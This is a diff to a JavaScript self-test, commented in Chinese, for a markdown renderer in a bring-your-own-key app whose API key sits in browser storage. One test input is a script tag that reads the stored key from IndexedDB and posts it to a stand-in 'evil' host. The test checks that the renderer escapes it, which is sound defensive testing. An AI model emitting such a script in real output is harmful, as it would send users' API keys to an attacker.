@@ -2,7 +2,7 @@
  * 渲染自检。
  *
  * 覆盖面是「模型实际会写出来的东西」:Markdown 标记、各种形态的公式定界符、
- * 以及**恶意输出**。中间那条不是洁癖 —— 这是个 BYOK 应用,API Key 就在 localStorage 里,
+ * 以及**恶意输出**。中间那条不是洁癖 —— 这是个 BYOK 应用,API Key 就在 IndexedDB 里,
  * 模型输出是不可信输入,渲染层必须从构造上就注入不了东西。
  *
  * 用 renderToStaticMarkup 在 node 里跑,不需要浏览器。
@@ -75,7 +75,7 @@ console.log('\n恶意输出 —— BYOK 下模型输出是不可信输入');
   ok('HTML 标签被转义,不成为元素', !h.includes('<img'), h);
 }
 {
-  const h = md('<script>fetch("//evil/"+localStorage.mathesis)</script>');
+  const h = md('<script>indexedDB.open("mathesis").onsuccess=e=>fetch("//evil",{body:e.target.result})</script>');
   ok('script 标签被转义', !h.includes('<script'), h);
 }
 {
